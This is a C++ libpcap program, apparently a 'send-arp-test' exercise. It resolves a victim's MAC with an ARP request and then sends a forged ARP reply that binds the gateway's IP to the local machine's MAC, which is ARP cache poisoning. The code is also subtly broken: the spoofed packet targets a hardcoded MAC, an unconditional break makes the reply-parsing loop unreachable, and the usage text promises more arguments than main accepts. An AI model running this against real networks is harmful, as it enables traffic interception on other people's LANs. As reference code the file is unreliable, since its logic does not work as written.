#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <errno.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <unistd.h>

#ifdef  DEBUG_LEVEL_
#define dp(n, fmt, args...)	if (DEBUG_LEVEL_ <= n) fprintf(stderr, "%s:%d,"fmt, __FILE__, __LINE__, ## args)
#define dp0(n, fmt)		if (DEBUG_LEVEL_ <= n) fprintf(stderr, "%s:%d,"fmt, __FILE__, __LINE__)
#define _dp(n, fmt, args...)	if (DEBUG_LEVEL_ <= n) fprintf(stderr, " "fmt, ## args)
#else	/* DEBUG_LEVEL_ */
#define dp(n, fmt, args...)
#define dp0(n, fmt)
#define _dp(n, fmt, args...)
#endif	/* DEBUG_LEVEL_ */

#pragma pack(push, 1)

char mymac[18]={0, };
char s_mac[18]={0, };
char myip[128]={0, };
Mac send_mac;

struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)

EthArpPacket packet;
struct libnet_ethernet_hdr *eth_header;

int main(int argc, char* argv[]);
int getip(char *interface);
void convrt_mac(const char *data, char *cvrt_str, int sz);
int my_mac(char *interface);
int sender_mac(char *interface, char *send_ip);



void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
		return -1;
	}

    my_mac(argv[1]);
    getip(argv[1]);
    sender_mac(argv[1],argv[2]);

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* sd_handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (sd_handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
    printf("start");


    printf("OK");

    packet.eth_.dmac_ = Mac("8a:e6:eb:b7:33:50");
    packet.eth_.smac_ = Mac(mymac);
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(mymac);
    packet.arp_.sip_ = htonl(Ip(argv[3])); // gateway
    packet.arp_.tmac_ = Mac("8a:e6:eb:b7:33:50");
    packet.arp_.tip_ = htonl(Ip(argv[2])); // sender

    int res = pcap_sendpacket(sd_handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(sd_handle));
	}

    pcap_close(sd_handle);
}

int getip(char *interface){
    struct ifreq ifr;
    int sock;
    struct sockaddr_in *sin;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        dp(4, "socket");
        return 0;
    }
    strcpy(ifr.ifr_name, interface);
    if (ioctl(sock, SIOCGIFADDR, &ifr)< 0)
    {
        dp(4, "ioctl() - get ip");
        close(sock);
        return 0;
     }
     sin = (struct sockaddr_in*)&ifr.ifr_addr;
     strcpy(myip, inet_ntoa(sin->sin_addr));
     close(sock);
     return 0;
}

int my_mac(char *interface){ //my mac address find
    int sock;
    struct ifreq ifr;
    char mac_adr[18] = {0, };
    sock = socket(AF_INET,SOCK_STREAM,0);
    if(sock < 0)
    {
        dp(4,"socket");
        return 0;
    }
    strcpy(ifr.ifr_name, interface);
    if(ioctl(sock, SIOCGIFHWADDR, &ifr)<0)
    {
        dp(4, "ioctl() - get mac");
        close(sock);
        return 0;
    }
    printf("%s",mymac);
    convrt_mac( ether_ntoa((struct ether_addr *)(ifr.ifr_hwaddr.sa_data)), mac_adr, sizeof(mac_adr) -1 );
    strcpy(mymac, mac_adr);
    close(sock);

    return 0;
}


void convrt_mac(const char *data, char *cvrt_str, int sz)
{
     char buf[128] = {0,};
     char t_buf[8];
     char *stp = strtok( (char *)data , ":" );
     int temp=0;
     do
     {
          memset( t_buf, 0, sizeof(t_buf) );
          sscanf( stp, "%x", &temp );
          snprintf( t_buf, sizeof(t_buf)-1, "%02X", temp );
          strncat( buf, t_buf, sizeof(buf)-1 );
          strncat( buf, ":", sizeof(buf)-1 );
     } while( (stp = strtok( NULL , ":" )) != NULL );
     buf[strlen(buf) -1] = '\0';
     strncpy( cvrt_str, buf, sz );
}

int sender_mac(char *interface, char *send_ip){
    printf("D1");
    char* dev = interface;
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* send_handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (send_handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    printf("D2");
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(mymac);
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(mymac);
    packet.arp_.sip_ = htonl(Ip(myip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(send_ip));

    int res_request = pcap_sendpacket(send_handle, reinterpret_cast<const u_char*>(&packet),sizeof(EthArpPacket));
    if (res_request != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_request, pcap_geterr(send_handle));
    }

    while(1){
        struct pcap_pkthdr* pcap_header;
        const u_char* reply_packet;
        int res = pcap_next_ex(send_handle, &pcap_header, &reply_packet);
        if(res==0) continue;
        if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
            printf("pcap_next_ex return %d(%s)\n",res,pcap_geterr(send_handle));
            return 0;
        }break;
        u_short ether_type;
        EthHdr* eth_header = (EthHdr*)reply_packet;
        ether_type = ntohs(eth_header->type());
        ArpHdr* arp_header = (ArpHdr*)(reply_packet+sizeof(EthHdr));

        if(ether_type == 0x0806){
            if(arp_header->hrd() == ArpHdr::ETHER && arp_header->pro() == EthHdr::Ip4 && arp_header->op() == ArpHdr::Reply){
                if(arp_header->sip() == Ip(send_ip) && arp_header->tip()==Ip(myip) && arp_header->tmac()==Mac(mymac)){
                    send_mac = arp_header -> smac();
                    pcap_close(send_handle);
                    return 0;
                }

            }
        }


    }

    return 0;

}

